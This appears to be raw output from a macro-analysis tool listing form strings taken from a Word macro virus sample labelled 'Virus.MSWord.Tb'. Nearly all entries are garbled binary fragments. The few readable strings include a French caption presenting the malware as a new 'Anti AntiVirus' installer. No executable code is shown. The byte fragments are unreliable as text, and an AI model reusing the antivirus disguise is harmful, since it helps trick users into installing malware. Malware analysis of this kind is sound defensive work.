VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0%��EyN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɤ�c�H�F\Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ppNГ�m�g@�2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M:��uW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yUO[�Y��6詤=.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��U�f'$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;N*��RYǗ�aBZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L~���>b��Y�Y骪z�g��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�i�e��Ͱ�F����ک��2�B���jC����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��U��J+��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��.�l��V�#��f�͜
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��vj૙"
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#,R�����*o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����e�
��R�q���+j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�o���+��ĺ{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�*_�R��jä�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�:�\�����V jo�O���������(3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�\C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�|��tgk��xC-��m�ك3y�̀��f\��C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��G>2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+����Tםe�˝4ۍ�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���o�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-����^����pz著���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>l�æX;����r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��G�z�u���ˀP����r�z덖~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�<�d,>��#p}�vü}��_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w��2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h'=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:/rks
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�r�3@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

PvB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g?�-0L��`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8Pu'����&?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�or���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,M-c�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���!i���a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�B��p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Q�+�R�uN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7;D=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,ᗶ8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"n�_�#��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��l`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��zB�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�O��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&y�MAN�8L�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��Q����'�7�W�ᔚ���hI�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�d�vI
`Ȳ'�tWO"�F�����8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�n����|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �ـm60�v`f3/QNI����|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'P�,���wz��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9ȭ�s�yh'A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѩ��2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F�(5p�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��QY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��H%j�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 R���]#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MW�͞�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ӟ6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��>'hN�n����^L	08�65��T*J�PԞ6��>u)L�(E�:����j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&��V��Q�[�AW��V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�/Ť��
Vkf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X��5�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ͩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���V6�ÌiY!J���b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g=k�|�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��6�Z����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�mmq�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}-)f�۶���=�mqi�\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��"W��M�v��\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�.)t�\�^���M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�Z"��/z�;_��ͽ���~ѫ_�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cH@o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ⶲ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�e1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8�-�g,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�}y|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+�1�ǋ�&�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^r����+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wʖ �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2 X�.�A<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��[�-��l����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lN��<g��Yͼ��I�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y΀�3��<h%�9�iN���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�hwm���;�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f6[z�gδ��lhI�9Ӄ���1mi6CZi�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]7R�����t�Wc�֬�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��Y�:׵
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!��֗������F��B`����2[�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=@g�9�w�v4e�mp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�u�vZ�QtO���>��7<U�ۃ�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���X_9�Y�7���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ic
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C@����;$`�����+~��cj���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4\�~q�b��n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*/��Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4����1�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�l�ߌ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A?��a�*�/�aI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G@�#�������:l7.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[��n׬���v����-��߸��f(��i�!�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g1^ ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�z���<�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�>�З~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�InstallerIJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Le nouveau Anti AntiVirus par ThunderByte/J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Installation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF87a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����#'�JN����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�TT�16���|io���g $�sx�rr������,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I��8�ͻ� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�di�h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/���j�oN�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߫	pH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�\2�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gV��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%L^-�ѴZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��|^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�x�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p|�|?D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�.h�Jm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W���ld
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Q~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��]�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���sl
